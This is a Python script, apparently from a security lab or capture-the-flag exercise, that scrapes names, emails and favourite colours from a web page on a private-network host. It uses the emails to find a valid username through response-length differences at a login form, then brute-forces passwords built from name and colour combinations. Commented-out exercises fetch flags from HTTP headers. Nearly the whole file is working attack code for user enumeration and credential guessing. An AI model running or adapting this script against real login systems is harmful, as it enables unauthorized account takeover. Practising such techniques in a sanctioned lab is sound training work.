#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import re

proxies = {'http' : '127.0.0.1:8080'}

url = "http://192.168.171.68:8080/about.html"

response = requests.get(url, proxies=proxies)

body = response.text

soup = BeautifulSoup(body, features="html.parser")
headers = soup.find_all('td')

index = 2
firstName = 0
color = 3

emails = []
firstNames = []
colors = []

for i in headers:
    try:
        string = headers[index]
        
        email = re.search(r'<td>(.*?)</td>', str(string)).group(1)

        emails.append(email)
        
        index += 4
    except:
        break

print("List of e-mails: " + ', '.join(emails))

login = "http://192.168.171.68:8080/login-3/"

print("\n[ X ] Finding username...")

for username in emails:

    data = {'username': username, 'password':'test'}

    attempt = requests.post(login, data=data, proxies=proxies)

    if len(attempt.content) != 1130:
        print("User Found --> " + username)
        break


for x in headers:

    try:

        stringFirstName = headers[firstName]
        firstNameValue = re.search(r'<td>(.*?)</td>', str(stringFirstName)).group(1)

        stringColor = headers[color]
        colorValue = re.search(r'<td>(.*?)</td>', str(stringColor)).group(1)

        firstNames.append(firstNameValue)
        colors.append(colorValue)

        firstName += 4
        color +=4
    except:
        break

colors = list(set(colors))

print("\nList of first names: " + ", ".join(firstNames))
print("List of colors: " + ", ".join(colors))

print("\n[ + ] Trying password with username: " + username)

for name in firstNames:
    for appendColor in colors:
        password = name + appendColor.capitalize() + name + appendColor.capitalize()
        
        data = {'username': username, 'password':password}

        attempt = requests.post(login, data=data, proxies=proxies)

        if len(attempt.content) != 1143:
            print("Password Found --> " + password)
            break

# print(response.text)

''' Exercise 2

response = requests.get(url)

with open("binary", mode="wb") as file:
    file.write(response.content)

print(response.text)
'''


''' Exercise 1

flag = ""

for i in range(1, 11):
    current = url + "/headers/" + str(i)
    response = requests.get(current)
    flag += response.headers['Flag']

print(flag)
'''